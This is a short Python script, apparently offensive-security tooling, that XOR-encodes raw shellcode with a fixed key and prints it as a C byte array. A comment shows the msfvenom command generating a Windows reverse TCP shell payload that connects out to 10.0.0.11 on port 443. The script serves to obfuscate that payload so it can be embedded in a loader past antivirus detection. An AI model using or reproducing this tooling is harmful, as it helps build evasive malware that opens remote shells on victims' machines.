


#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.11 LPORT=443 -f raw > /tmp/met.bin
data = bytearray(open('met.bin',  'rb').read())
key  = bytearray("supersecret","utf-8")

for i in range(len(data)):
    data[i] ^= key[i % len(key)]

print("unsigned char buf[] = {",end=" ")
for i in range(0,len(data)):
    if i == len(data)-1:
        print("\'\\x"+str(hex(data[i])[2:])+"\'", end="")
    else:
        print("\'\\x"+str(hex(data[i])[2:])+"\'", end=",")
print("};")


